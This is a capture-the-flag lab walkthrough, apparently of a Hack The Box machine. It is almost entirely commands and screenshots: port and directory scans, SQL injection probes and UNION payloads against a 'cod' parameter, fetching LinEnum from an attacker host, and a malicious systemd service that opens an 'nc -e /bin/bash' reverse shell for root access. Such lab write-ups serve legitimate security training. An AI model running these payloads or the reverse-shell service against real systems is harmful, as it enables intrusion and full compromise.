```
SQL injection
Webshell
sudo -l
Reverse Shell - Bash
LinEnum
PrivEsc - systemctl
```

```
nmap -sS -sC -sV -T5 -Pn 10.10.10.143
```
![image](https://user-images.githubusercontent.com/33616880/231966154-8ab1d289-572e-4097-8072-e2a664de70ca.png)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.143/FUZZ -fc 403 -e .aspx,.php,.txt,.html
```
![image](https://user-images.githubusercontent.com/33616880/231966267-6a6058e9-6223-44d8-acd9-72244a55407f.png)


```
http://10.10.10.143/room.php?cod=2
```
![image](https://user-images.githubusercontent.com/33616880/231967239-40ac1ae1-c35f-4c56-9740-62bd236b9436.png)


```
http://10.10.10.143/room.php?cod=2%20and%201=1
```
![image](https://github.com/regarmulia/HTB/assets/33616880/954aab73-ed1c-419c-8120-3785d666d6ad)

![image](https://user-images.githubusercontent.com/33616880/231967993-6a81e947-d988-4e23-9042-a8ba3eb2bca0.png)

```
https://book.hacktricks.xyz/pentesting-web/sql-injection
http://10.10.10.143/room.php?cod=2%20and%20sleep(1)
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ddf2a7c4-21db-4f02-b720-c395f310f43d)

![image](https://github.com/regarmulia/HTB/assets/33616880/3d1f65d6-d527-4714-96fd-937e21ca143e)


```
http://10.10.10.143/room.php?cod=2%20UNION%20SELECT%201,2,3,4,5,6
```
![image](https://github.com/regarmulia/HTB/assets/33616880/e3378196-1f96-4498-80f3-f98126a10cb9)


```
http://10.10.10.143/room.php?cod=-2%20UNION%20SELECT%20@@version,2,3,4,5,6,7
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d80371a3-ed4b-47d9-affa-b27701b9a6e0)













```
wget 10.10.14.8/LinEnum.sh
./LinEnum.sh
```
![image](https://user-images.githubusercontent.com/33616880/231979671-3ca30d26-3d40-412d-9cca-28b91cfaf839.png)
![image](https://user-images.githubusercontent.com/33616880/231979698-96af9d79-761b-4c32-a848-0c182173242e.png)


https://gtfobins.github.io/gtfobins/systemctl/
```
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```
```
systemctl link /home/pepper/pwn.service
systemctl start pwn
```
![image](https://user-images.githubusercontent.com/33616880/231983233-c91e3200-561c-4995-8062-6cec3de97037.png)
![image](https://user-images.githubusercontent.com/33616880/231983256-1099084a-99c6-4477-a764-4c9530724f65.png)



